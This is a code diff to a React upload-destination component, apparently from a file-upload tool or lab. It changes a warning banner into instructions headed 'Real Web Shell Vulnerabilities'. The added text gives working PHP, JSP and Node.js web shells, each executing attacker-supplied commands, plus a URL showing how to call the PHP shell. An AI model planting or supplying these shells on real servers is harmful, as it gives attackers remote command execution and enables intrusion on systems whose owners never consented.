@@ -133,10 +133,22 @@ const DestinationSelector = ({
               <span>Web Shell Upload Mode Enabled</span>
             </div>
             <p className="text-xs">
-              Warning: Uploading PHP files to the web server paths will create a web shell.<br />
-              Example PHP web shell code:<br />
+              <strong>Real Web Shell Vulnerabilities:</strong><br />
+              1. <strong>PHP Web Shell:</strong> Create a file with <code>.php</code> extension containing:<br />
               <code>
                 &lt;?php system($_GET['cmd']); ?&gt;
+              </code><br />
+              Access via: http://server/shell.php?cmd=ls<br /><br />
+              
+              2. <strong>JSP Web Shell:</strong> Create a file with <code>.jsp</code> extension containing:<br />
+              <code>
+                &lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;
+              </code><br /><br />
+              
+              3. <strong>Node.js Web Shell:</strong> Create a file with <code>.js</code> extension containing:<br />
+              <code>
+                const { exec } = require('child_process');<br />
+                exec(process.env.CMD || 'ls -la');
               </code>
             </p>
           </div>
